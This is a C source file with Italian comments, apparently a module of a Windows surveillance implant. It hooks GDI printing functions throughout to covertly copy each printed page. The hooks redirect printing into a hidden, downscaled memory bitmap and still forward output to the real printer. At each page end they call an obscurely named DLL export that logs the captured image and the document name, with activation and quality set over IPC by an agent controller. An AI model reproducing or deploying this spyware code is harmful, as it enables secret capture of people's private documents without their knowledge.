
#define SCALING_FACTOR 6   // 1=dimensioni originali, 10=buona perdita
#define DOC_NAME_LEN 256
#define HDUMMY 0xabadc0de
#define GET_ARGS	__asm 	PUSH ESI \
					__asm	LEA ESI, DWORD PTR [EBP+0x8] \
					__asm	MOV [arg_ptr], ESI \
					__asm	POP ESI 

// Struttura di configurazione via IPC
typedef struct {
	BOOL active;  // La prima variabile deve essere il BOOL di attivazione
	DWORD scaling_factor;
} print_pool_conf;


////////////////////////////// Wrappers per print pool //////////////////////

//////////////////////////
//						//
//	     CreateDCW      //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateCompatibleDC_t pCreateCompatibleDC;
	CreateCompatibleBitmap_t pCreateCompatibleBitmap;
	GetDeviceCaps_t pGetDeviceCaps;
	SelectObject_t pSelectObject;
	FillRect_t pFillRect;
	CreateBrushIndirect_t pCreateBrushIndirect;
	HDC printer_dc;
	HDC memory_dc;
	DWORD x_dim, y_dim; // Verranno usate poi per la BitBlt sul device context della stampante in EndPage
	DWORD x_real, y_real; // Valori reali senza scaling factor
	HBITMAP memory_bitmap;
	HBRUSH hbrush;
	DWORD scaling_factor;
	WCHAR doc_name[DOC_NAME_LEN+2]; // Nome del documento stampato. (assicura il NULL terminate)
} CreateDCDataStruct;

CreateDCDataStruct CreateDC_data;

static DWORD WINAPI CreateDC_wrap(DWORD ARG1, DWORD ARG2, DWORD ARG3, DWORD ARG4)
{
	LOGBRUSH fill_brush;
	RECT fill_rect;
	print_pool_conf *print_conf;

	MARK_HOOK

	INIT_WRAPPER(CreateDCDataStruct);

	CALL_ORIGINAL_API(4);

	// Se fallisce o l'agent e' disattivato, ritorna
	print_conf = (print_pool_conf *)pData->pHM_IpcCliRead(PM_PRINTAGENT);
	if (!ret_code || !print_conf || !(print_conf->active))
		return ret_code;

	// Verifica che il DeviceContext creato sia relativo a una stampante
	if (pData->pGetDeviceCaps((HDC)ret_code, 2) == 2) {
		pData->scaling_factor = print_conf->scaling_factor;
		pData->printer_dc = (HDC)ret_code;
		pData->memory_dc = pData->pCreateCompatibleDC(pData->printer_dc);	
		pData->x_real = pData->pGetDeviceCaps(pData->printer_dc, HORZRES);
		pData->y_real = pData->pGetDeviceCaps(pData->printer_dc, VERTRES);

		pData->x_dim = pData->x_real / pData->scaling_factor;
		pData->y_dim = pData->y_real / pData->scaling_factor;

		pData->memory_bitmap = pData->pCreateCompatibleBitmap(pData->printer_dc, pData->x_dim, pData->y_dim); 
		pData->pSelectObject(pData->memory_dc, pData->memory_bitmap);

		// Riempie la bitmap di bianco (crea il brush solo la prima volta 
		// viene richiamato, e non lo distrugge mai).
		if (pData->hbrush == (HBRUSH)HDUMMY) {
			fill_brush.lbStyle = BS_SOLID;
			fill_brush.lbColor = RGB(0xFF, 0xFF, 0xFF);
			pData->hbrush = pData->pCreateBrushIndirect(&fill_brush);
		}
		fill_rect.left = fill_rect.top = 0;
		fill_rect.right = pData->x_dim;
		fill_rect.bottom = pData->y_dim;
		pData->pFillRect(pData->memory_dc, &fill_rect, pData->hbrush);

		ret_code = (DWORD)pData->memory_dc;
	}
	return ret_code;
}

static DWORD CreateDC_setup(HMServiceStruct *pData)
{
	HMODULE h_gdi;
	HMODULE h_usr;

	VALIDPTR(h_gdi = LoadLibrary("GDI32.dll"));
	VALIDPTR(h_usr = LoadLibrary("User32.dll"));
	VALIDPTR(CreateDC_data.pGetDeviceCaps = (GetDeviceCaps_t)HM_SafeGetProcAddress(h_gdi, "GetDeviceCaps"));
	VALIDPTR(CreateDC_data.pCreateCompatibleDC = (CreateCompatibleDC_t)HM_SafeGetProcAddress(h_gdi, "CreateCompatibleDC"));
	VALIDPTR(CreateDC_data.pCreateCompatibleBitmap = (CreateCompatibleBitmap_t)HM_SafeGetProcAddress(h_gdi, "CreateCompatibleBitmap"));
	VALIDPTR(CreateDC_data.pSelectObject = (SelectObject_t)HM_SafeGetProcAddress(h_gdi, "SelectObject"));
	VALIDPTR(CreateDC_data.pCreateBrushIndirect = (CreateBrushIndirect_t)HM_SafeGetProcAddress(h_gdi, "CreateBrushIndirect"));
	VALIDPTR(CreateDC_data.pFillRect = (FillRect_t)HM_SafeGetProcAddress(h_usr, "FillRect"));

	CreateDC_data.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateDC_data.printer_dc = CreateDC_data.memory_dc = (HDC)HDUMMY;
	CreateDC_data.memory_bitmap = (HBITMAP)HDUMMY;
	CreateDC_data.hbrush = (HBRUSH)HDUMMY;
	CreateDC_data.x_dim = CreateDC_data.y_dim =0;
	CreateDC_data.scaling_factor = SCALING_FACTOR;
	// All'inizio il nome del file stampato e' vuoto
	ZeroMemory(CreateDC_data.doc_name, sizeof(CreateDC_data.doc_name));

	CreateDC_data.dwHookLen = 600;
	return 0;
}



//////////////////////////
//						//
//	     DeleteDC       //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
	DeleteObject_t pDeleteObject;
} DeleteDC_data_struct;

DeleteDC_data_struct DeleteDC_data;

static DWORD WINAPI DeleteDC_wrap(DWORD ARG1)
{
	DWORD *arg_ptr;

	MARK_HOOK

	INIT_WRAPPER(DeleteDC_data_struct);
	GET_ARGS;

	// Se e' una DeleteDC sul memory_dc e abbiamo due DC diversi
	// (quando e' disattivo sono entrambi settati su HDUMMY)
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc &&
		pData->c_data->memory_dc != pData->c_data->printer_dc) {
		pData->pDeleteObject(pData->c_data->memory_bitmap);
		CALL_ORIGINAL_API(1);
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;
		// Azzera gli handle che ormai non esistono piu'
		pData->c_data->memory_dc = pData->c_data->printer_dc = (HDC)HDUMMY;
	}

	CALL_ORIGINAL_API(1);
	
	return ret_code;
}



static DWORD DeleteDC_setup(HMServiceStruct *pData)
{
	HMODULE h_gdi;

	VALIDPTR(h_gdi = LoadLibrary("GDI32.dll"));
	VALIDPTR(DeleteDC_data.pDeleteObject = (DeleteObject_t)HM_SafeGetProcAddress(h_gdi, "DeleteObject"));

	DeleteDC_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	DeleteDC_data.dwHookLen = 300; 
	return 0;
}




//////////////////////////
//						//
//	     EndPage        //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	char szDLLName[DLLNAMELEN];
	char print_screen_name[30];
	CreateDCDataStruct *c_data;
	LoadLibrary_t pLoadLibrary;
	FreeLibrary_t pFreeLibrary;
	FillRect_t pFillRect;
	GetProcAddress_t pGetProcAddress;
	StretchBlt_t pStretchBlt; 
} EndPage_data_struct;

EndPage_data_struct EndPage_data;

static DWORD WINAPI EndPage_wrap(DWORD ARG1)
{
	typedef void (__stdcall *PrintScreen_t)(WCHAR *, HDC, HBITMAP, DWORD, DWORD);
	HMODULE h_mod;
	DWORD *arg_ptr;
	RECT fill_rect;
	BOOL *Active;
	PrintScreen_t pPrintScreen;

	MARK_HOOK

	INIT_WRAPPER(EndPage_data_struct);
	GET_ARGS;

	// E' una EndPage sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc && 
		pData->c_data->memory_dc != pData->c_data->printer_dc) {
		// L'API originale verra' chiamata sul device context della stampante
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

		// Copia il contenuto del context virtuale sulla stampante
		pData->pStretchBlt(pData->c_data->printer_dc, 0, 0, pData->c_data->x_real, pData->c_data->y_real, pData->c_data->memory_dc, 0, 0, pData->c_data->x_dim, pData->c_data->y_dim, SRCCOPY);		

		// Acuisisce la bitmap e la logga su file (solo se l'agent e' ancora attivo)
		Active = (BOOL *)pData->pHM_IpcCliRead(PM_PRINTAGENT);
		if (Active && (*Active)) {
			h_mod = pData->pLoadLibrary(pData->szDLLName);
			if (h_mod) {
				pPrintScreen = (PrintScreen_t)pData->pGetProcAddress(h_mod, pData->print_screen_name);
				if (pPrintScreen)
					pPrintScreen(pData->c_data->doc_name, pData->c_data->memory_dc, pData->c_data->memory_bitmap, pData->c_data->x_dim, pData->c_data->y_dim);
				pData->pFreeLibrary(h_mod);
			}
		}
		// Pulisce il memory device context
		fill_rect.left = fill_rect.top = 0;
		fill_rect.right = pData->c_data->x_dim;
		fill_rect.bottom = pData->c_data->y_dim;
		pData->pFillRect(pData->c_data->memory_dc, &fill_rect, pData->c_data->hbrush);
	}
    
	CALL_ORIGINAL_API(1);
	return ret_code;
}

static DWORD EndPage_setup(HMServiceStruct *pData)
{
	HMODULE h_mod;
	HMODULE h_gdi;
	HMODULE h_usr;

	VALIDPTR(h_mod = GetModuleHandle("KERNEL32.dll"));
	VALIDPTR(h_gdi = LoadLibrary("GDI32.dll"));
	VALIDPTR(h_usr = LoadLibrary("User32.dll"));

	VALIDPTR(EndPage_data.pLoadLibrary = (LoadLibrary_t)HM_SafeGetProcAddress(h_mod, "LoadLibraryA"));
	VALIDPTR(EndPage_data.pFreeLibrary = (FreeLibrary_t)HM_SafeGetProcAddress(h_mod, "FreeLibrary"));
	VALIDPTR(EndPage_data.pGetProcAddress = (GetProcAddress_t)HM_SafeGetProcAddress(h_mod, "GetProcAddress"));
	VALIDPTR(EndPage_data.pStretchBlt = (StretchBlt_t)HM_SafeGetProcAddress(h_gdi, "StretchBlt"));
	VALIDPTR(EndPage_data.pFillRect = (FillRect_t)HM_SafeGetProcAddress(h_usr, "FillRect"));

	EndPage_data.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	// Funzione di stampa su file esportata
	sprintf(EndPage_data.print_screen_name, "PPPFTBBP06");
	HM_CompletePath(H4DLLNAME, EndPage_data.szDLLName);

	EndPage_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	EndPage_data.dwHookLen = 400;
	return 0;
}


//////////////////////////
//						//
//	    StartPage       //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} StartPage_data_struct;

StartPage_data_struct StartPage_data;

static DWORD WINAPI StartPage_wrap(DWORD ARG1)
{	
	DWORD *arg_ptr;

	MARK_HOOK

	INIT_WRAPPER(StartPage_data_struct);
	GET_ARGS;
	
	// E' una StartPage sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc) 
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

	CALL_ORIGINAL_API(1);
	return ret_code;
}

static DWORD StartPage_setup(HMServiceStruct *pData)
{
	StartPage_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	StartPage_data.dwHookLen = 150; 
	return 0;
}


//////////////////////////
//						//
// 	      EndDoc        //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} EndDoc_data_struct;

EndDoc_data_struct EndDoc_data;

static DWORD WINAPI EndDoc_wrap(DWORD ARG1)
{	
	DWORD *arg_ptr;

	MARK_HOOK

	INIT_WRAPPER(EndDoc_data_struct);
	GET_ARGS;

	// E' una EndDoc sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc) 
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

	CALL_ORIGINAL_API(1);
	return ret_code;
}

static DWORD EndDoc_setup(HMServiceStruct *pData)
{
	EndDoc_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	EndDoc_data.dwHookLen = 150; 
	return 0;
}


//////////////////////////
//						//
//      StartDoc        //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} StartDoc_data_struct;

StartDoc_data_struct StartDoc_data;

static DWORD WINAPI StartDoc_wrapA(DWORD ARG1, DWORD ARG2)
{
	DWORD *arg_ptr;
	DWORD i;
	DOCINFOA *doc_info;
	BYTE *ptr_name;

	MARK_HOOK

	INIT_WRAPPER(StartDoc_data_struct);
	GET_ARGS;

	// E' una StartDoc sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc && 
		pData->c_data->memory_dc != pData->c_data->printer_dc) { 
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

		// Salva il nome del documento stampato
		doc_info = (DOCINFOA *) arg_ptr[1];
		if (doc_info && doc_info->lpszDocName) {
			// ASCII
			ptr_name = (BYTE *)pData->c_data->doc_name;
			for (i=0; i<(DOC_NAME_LEN); i++) {
				ptr_name[i*2] = doc_info->lpszDocName[i];
				ptr_name[i*2+1] = 0;
				if (doc_info->lpszDocName[i] == 0)
					break;
			}
		}
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}


static DWORD WINAPI StartDoc_wrapW(DWORD ARG1, DWORD ARG2)
{
	DWORD *arg_ptr;
	DWORD i;
	DOCINFOW *doc_info;

	MARK_HOOK

	INIT_WRAPPER(StartDoc_data_struct);
	GET_ARGS;

	// E' una StartDoc sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc && 
		pData->c_data->memory_dc != pData->c_data->printer_dc) { 
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

		// Salva il nome del documento stampato
		doc_info = (DOCINFOW *) arg_ptr[1];
		if (doc_info && doc_info->lpszDocName) {
			// WideChar
			for (i=0; i<(DOC_NAME_LEN); i++) {
				pData->c_data->doc_name[i] = doc_info->lpszDocName[i];
				if (pData->c_data->doc_name[i] == 0)
					break;
			}
		}		
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

static DWORD StartDoc_setup(HMServiceStruct *pData)
{
	StartDoc_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	StartDoc_data.dwHookLen = 570; 
	return 0;
}


//////////////////////////
//						//
// 	  GetDeviceCaps     //
//						//
//////////////////////////
typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} GetDeviceCaps_data_struct;

GetDeviceCaps_data_struct GetDeviceCaps_data;

static DWORD WINAPI GetDeviceCaps_wrap(DWORD ARG1, DWORD ARG2)
{	
	DWORD *arg_ptr;

	MARK_HOOK

	INIT_WRAPPER(GetDeviceCaps_data_struct);
	GET_ARGS;

	// E' una GetDeviceCaps sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc && 
		pData->c_data->memory_dc != pData->c_data->printer_dc) {
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

		CALL_ORIGINAL_API(2);

		// Sul nostro DC deve operarare la scalatura per
		// diversi fattori
		if (arg_ptr[1] == HORZRES ||
			arg_ptr[1] == VERTRES ||
			arg_ptr[1] == LOGPIXELSX ||
			arg_ptr[1] == LOGPIXELSY ||
			arg_ptr[1] == PHYSICALWIDTH ||
			arg_ptr[1] == PHYSICALHEIGHT ||
			arg_ptr[1] == PHYSICALOFFSETX ||
			arg_ptr[1] == PHYSICALOFFSETY)
				ret_code = ret_code / (pData->c_data->scaling_factor);
	
		return ret_code;
	}

	CALL_ORIGINAL_API(2);
	return ret_code;
}

static DWORD GetDeviceCaps_setup(HMServiceStruct *pData)
{
	GetDeviceCaps_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	GetDeviceCaps_data.dwHookLen = 420; 
	return 0;
}


//////////////////////////
//						//
//     SetAbortProc     //
//						//
//////////////////////////
typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} SetAbortProc_data_struct;

SetAbortProc_data_struct SetAbortProc_data;

static DWORD WINAPI SetAbortProc_wrap(DWORD ARG1, DWORD ARG2)
{	
	DWORD *arg_ptr;

	MARK_HOOK

	INIT_WRAPPER(SetAbortProc_data_struct);
	GET_ARGS;

	// E' una SetAbortProc sul device context virtuale
	if (arg_ptr[0] == (DWORD)pData->c_data->memory_dc) 
		arg_ptr[0] = (DWORD)pData->c_data->printer_dc;

	CALL_ORIGINAL_API(2);
	return ret_code;
}

static DWORD SetAbortProc_setup(HMServiceStruct *pData)
{
	SetAbortProc_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	SetAbortProc_data.dwHookLen = 150; 
	return 0;
}



//////////////////////////
//						//
//	     CreateDCA      //
//						//
//////////////////////////

typedef struct {
	COMMONDATA;
	CreateDCDataStruct *c_data;
} CreateDCADataStruct;

CreateDCADataStruct CreateDCA_data;

static DWORD WINAPI CreateDCA_wrap(DWORD ARG1, DWORD ARG2, DWORD ARG3, DWORD ARG4)
{
	LOGBRUSH fill_brush;
	RECT fill_rect;
	print_pool_conf *print_conf;

	MARK_HOOK

	INIT_WRAPPER(CreateDCADataStruct);

	CALL_ORIGINAL_API(4);

	// Se fallisce o l'agent e' disattivato, ritorna
	print_conf = (print_pool_conf *)pData->pHM_IpcCliRead(PM_PRINTAGENT);
	if (!ret_code || !print_conf || !(print_conf->active))
		return ret_code;

	// Accede a tutti i dati della versione WideChar della funzione
	// tramite c_data

	// Verifica che il DeviceContext creato sia relativo a una stampante
	if (pData->c_data->pGetDeviceCaps((HDC)ret_code, 2) == 2) {
		pData->c_data->scaling_factor = print_conf->scaling_factor;
		pData->c_data->printer_dc = (HDC)ret_code;
		pData->c_data->memory_dc = pData->c_data->pCreateCompatibleDC(pData->c_data->printer_dc);	
		pData->c_data->x_real = pData->c_data->pGetDeviceCaps(pData->c_data->printer_dc, HORZRES);
		pData->c_data->y_real = pData->c_data->pGetDeviceCaps(pData->c_data->printer_dc, VERTRES);

		pData->c_data->x_dim = pData->c_data->x_real / pData->c_data->scaling_factor;
		pData->c_data->y_dim = pData->c_data->y_real / pData->c_data->scaling_factor;

		pData->c_data->memory_bitmap = pData->c_data->pCreateCompatibleBitmap(pData->c_data->printer_dc, pData->c_data->x_dim, pData->c_data->y_dim); 
		pData->c_data->pSelectObject(pData->c_data->memory_dc, pData->c_data->memory_bitmap);

		// Riempie la bitmap di bianco (crea il brush solo la prima volta 
		// viene richiamato, e non lo distrugge mai).
		if (pData->c_data->hbrush == (HBRUSH)HDUMMY) {
			fill_brush.lbStyle = BS_SOLID;
			fill_brush.lbColor = RGB(0xFF, 0xFF, 0xFF);
			pData->c_data->hbrush = pData->c_data->pCreateBrushIndirect(&fill_brush);
		}
		fill_rect.left = fill_rect.top = 0;
		fill_rect.right = pData->c_data->x_dim;
		fill_rect.bottom = pData->c_data->y_dim;
		pData->c_data->pFillRect(pData->c_data->memory_dc, &fill_rect, pData->c_data->hbrush);

		ret_code = (DWORD)pData->c_data->memory_dc;
	}
	return ret_code;
}

static DWORD CreateDCA_setup(HMServiceStruct *pData)
{
	CreateDCA_data.c_data = (CreateDCDataStruct *)pData->PARAM[0];
	CreateDCA_data.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateDCA_data.dwHookLen = 700;
	return 0;
}



////////////////// Funzioni per la gestione dell'agent ///////////////

DWORD __stdcall PM_PrintAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	AM_IPCAgentStartStop(PM_PRINTAGENT, bStartFlag);	
	return 1;
}


DWORD __stdcall PM_PrintAgentInit(JSONObject elem)
{
	print_pool_conf print_conf;

	// Setta lo scaling factor via IPC
	print_conf.active = FALSE;
	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
		print_conf.scaling_factor = 2; 
	} else if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"med") ) {
		print_conf.scaling_factor = 4;
	} else { 
		print_conf.scaling_factor = 6;
	}

	IPCServerWrite(PM_PRINTAGENT, (BYTE *)&print_conf, sizeof(print_conf));
	return 1;
}


void PM_PrintAgentRegister()
{
	AM_MonitorRegister(L"print", PM_PRINTAGENT, (BYTE *)NULL, (BYTE *)PM_PrintAgentStartStop, (BYTE *)PM_PrintAgentInit, NULL);
}